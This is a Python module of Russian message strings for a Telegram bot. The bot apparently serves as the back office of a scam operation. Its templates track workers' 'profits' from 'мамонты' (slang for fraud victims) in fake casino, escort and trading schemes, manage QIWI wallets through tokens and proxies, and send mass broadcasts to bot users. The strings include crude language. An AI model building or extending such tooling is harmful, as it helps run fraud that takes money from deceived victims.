from aiogram.utils.emoji import emojize


# worker commands
btc_text = emojize(
    ":money_with_wings: <b>Актуальный</b> курс BTC - {usd} $ (~ {rub} ₽)"
)


help_text = emojize(
    ":woman_tipping_hand: <b>Команды</b> конфы\n\n"
    "/clc <code>[выражение]</code> - Посчитать на калькуляторе\n"
    "/lzt <code>[ник на LZT]</code> - Найти профить лолза\n"
    "/hash <code>[хэш]</code> - Инфо о BTC хэше\n"
    "/btc <code>[адрес]</code> - Инфо о BTC адресе\n"
    "/help - Показать список команд\n"
    "/me - Показать инфо о себе\n"
    "/btc - Курс биткоина"
)

me_text = emojize(
    ":woman_tipping_hand: {status} <a href='tg://user?id={cid}'>{username}</a>\n"
    "Telegram ID: {cid}\n\n"
    "{profits} на сумму {sum_profits} ₽\n"
    "Средний профит ~ {middle_profits} ₽\n\n"
    "В команде {in_team}, {warns}"
)

lzt_text = emojize(
    "LZT <a href='{permalink}'>{username}</a>\n"
    "Статус: {user_title}\n"
    "Регистрация: {reg_date}\n"
    "Активность: {last_seen_date}\n"
    "{message_count}, {like_count} симп"
)

lolz_down_text = "Задержка запроса, скорей всего <b>Лолзтим</b> упал :("

cck_size_text = "Мой размер чилена - {size}см {smile}"


# admins commands
adm_work_command = emojize("<b>Состояние</b> сервисов:\n" "{services_status}")

# work command
setwork_text = emojize("<b>Поставлен</b> ворк :white_check_mark:")
setdontwork_text = emojize("<b>Поставлен</b> неворк :x:")

casino_setwork_text = emojize("Казино - <b>Поставлен</b> ворк :white_check_mark:")
casino_setdontwork_text = emojize("Казино - <b>Поставлен</b> неворк :x:")
escort_setwork_text = emojize("Эскорт - <b>Поставлен</b> ворк :white_check_mark:")
escort_setdontwork_text = emojize("Эскорт - <b>Поставлен</b> неворк :x:")
trading_setwork_text = emojize("Трейдинг - <b>Поставлен</b> ворк :white_check_mark:")
trading_setdontwork_text = emojize("Трейдинг - <b>Поставлен</b> неворк :x:")


qiwi_command_text = emojize(
    ":kiwi_fruit: Информация по киви кошелькам.\n\n"
    "Общий баланс: <b>{all_balance} RUB</b>"
)

no_qiwis_text = emojize("У вас нет привязанных кошельков! :x:")

qiwi_error_text = emojize(
    "Какая-то ошибка в киви, попробуй еще раз или позови кодера) :warning:"
)

add_qiwis_text = emojize(
    "Введите <b>Токен</b>, и  <b>По желанию</b> Прокси, пример:\n"
    "<code>f420543a9430065db1264535ff4eb1ae</code>\n"
    "<code>http://user:pass@123.222.222.123:1111</code>"
)

invalid_newqiwi_text = emojize(
    "Допущена ошибка при вводе! :warning:\n"
    "Введите <b>Токен</b> и Прокси <b>(Не обяз.)</b>, пример:\n"
    "<code>f420543a9430065db1264535ff4eb1ae</code>\n"
    "<code>http://user:pass@123.222.222.123:1111</code> (По желанию)"
)

qiwi_info_text = emojize(
    "Кошелек: <b>+{number}</b> :kiwi_fruit:\n"
    "Баланс: <b>{balance}</b>\n"
    "Сумма платежей: <b>+{incoming}</b> <b>-{outgoing}</b>\n"
    "Статус: <b>{status}</b>\n"
    "Прокси: <i>{proxy_url}</i>\n\n"
    "{last_actions}"
)

same_qiwi_text = emojize("Похоже вы пытаетесь добавить такой же киви кошелек)")

qiwi_delete_text = emojize(
    ":wastebasket: Удаляю кошелек с токеном:\n" "<code>{token}</code>"
)

qiwi_selfdelete_text = emojize("Вы уверенны чо хатите удалить этат киви сука")

qiwi_add_proxy_text = emojize(
    "Введите <b>HTTP</b> прокси, пример:\n"
    "<code>http://user:pass@123.123.123.123:1111</code>"
)

new_proxy_success_text = emojize("Прокси добавленны для этого кошелька.")

qiwi_proxy_delete = emojize(
    "Удаляю прокси: <i>{proxy}</i>\n"
    "Для кошелька c этим токеном: <code>{token}</code>"
)

proxy_error_text = "Что-та с удалением прокси зови кодера нахуй!!"

alert_text = emojize(
    "Отправка сообщения <b>всем</b> пользователя бота.\n"
    ":face_with_monocle: Выберите бота для оповещений."
)

make_alert_text = emojize(
    "Отправка всем пользователям <b>{bot_type}</b>\n" ":imp: Введите текст:"
)

edit_alert_text = emojize(
    "Отравка всем пользователям <b>{bot_type}</b>\n" ":imp: Введите <b>новый</b> текст:"
)

alert_accept_text = emojize(
    ":thinking_face: Вы уверены что хотите отправить это?\n\n{text}"
)

alert_reject_text = emojize(":wastebasket: Текст <b>не будет</b> отправлен!")

alert_start_text = emojize(
    "Начинаю рассылку всем пользователям.\n"
    "Кол-во пользователей: <b>{len_users}</b>\n\n"
    "Сообщений отправлено: <b>{msg_count}</b>\n"
    "Заблокировали бота: <b>{blocked_count}</b>\n"
    "Не найдено: <b>{not_found_count}</b>\n\n"
    "Обновленно: {timenow}"
)

alert_complete_text = "Рассылка завершилась)"

sys_info_text = emojize(
    ":mechanical_arm: Информация о системе:\n\n"
    "Кол-во ядер: <b>{cpu_count}</b>\n"
    "Кол-во ОЗУ: <b>{ram_count} МБ</b>\n\n"
    "Загруженность ОЗУ: <b>{ram_usage}</b> %\n"
    "Загруженность ЦП: <b>{cpu_usage}</b> %\n\n"
    "Время работы компьютера: <b>{computer_work}</b>"
)

admins_help_text = emojize(
    ":woman_tipping_hand: <b>Команды</b> конфы\n"
    "/sysinfo - Информация о сервере.\n"
    "/pin или /pinned - Действия с закрепленным сообщением.\n"
    "/qiwi - Работа с киви кошельками.\n"
    "/alert - Работа с Оповещениями.\n"
    "/work - Действия с статусом работы проекта.\n"
    "/btc_auth - Проверка Авторизации в аккаунте банкира.\n"
    "/btc_logout - Выйти из аккаунта банкира.\n"
    "/mkprft - Создать профит\n"
    "/prftstick - Стикер к профиту\n"
    "/stat - Статистика проекта\n"
    "/card - Изменить карту для прямиков\n"
    "/nstatus <code>[ID Воркера]</code> - Изменить статус воркера\n"
    # "/card - Изменить карту для прямиков\n"
    "/new_dsgn - Бета хуета ещо нету)\n"
)

admin_make_profit_text = emojize(
    "Заполни данные таким образом :point_up_2:\n\n"
    "<a href='t.me/userinfobot'>Telegram ID</a>\n"
    "Сумма и доля в %\n"
    "<b>0</b>, <b>1</b>, <b>2</b>, <b>3</b> - <i>Казино, Эскорт, Трейдинг, Прямик</i>\n"
    "Пример:\n\n"
    "<code>1404657362</code>\n"
    "<code>1000</code>\n"
    "<code>70</code>\n"
    "<code>1</code>"
)

ban_success_text = emojize("Успешно забанил <a href='tg://user?id={cid}'>{name}</a>")
kick_success_text = emojize("Успешно кикнул <a href='tg://user?id={cid}'>{name}</a>")

worker_warn_text = emojize(
    "Для <a href='tg://user?id={cid}'>{name}</a> поставленно предупреждение! ({warns}/3)."
)

worker_unwarn_text = emojize(
    "Для <a href='tg://user?id={cid}'>{name}</a> снято предупреждение ({warns}/3)."
)

statistic_text = emojize(
    ":monkey: Статистика проекта\n\n"
    "<i>Кол-во Воркеров</i>: <b>{workers_count}</b> (<i>{bot_users_count}</i>)\n"
    "<i>Кол-во Мамонтов Казик</i>: <b>{casino_count}</b>\n"
    "<i>Кол-во Мамонтов Эскорт</i>: <b>{escort_count}</b>\n"
    "<i>Кол-во Мамонтов Трейдинг</i>: <b>{trading_count}</b>\n\n"
    "<i>Общее кол-во профитов</i>: <b>{profits_count}</b>\n"
    "<i>Общая сумма профитов</i>: <b>{profits_amount} RUB</b>\n"
    "<i>Заработанно всего</i>: <b>{profits_cash} RUB</b>\n"
    "<i>Средний профит на воркера</i>: <b>{profits_middle} RUB</b>\n\n"
    ":anchor: Статистика за сегодня\n"
    "<i>Новых воркеров</i>: <b>{workers_count_today} (<i>{bot_users_count_today}</i>)</b>\n"
    "<i>Кол-во профитов</i>: <b>{profits_count_today}</b>\n"
    "<i>Сумма профитов</i>: <b>{profits_amount_today} RUB</b>\n"
    "<i>Средний профит сегодня</i>: <b>{profits_middle_today} RUB</b>\n"
    "<i>Заработанно сегодня</i>: <b>{profits_cash_today} RUB</b>\n"
)
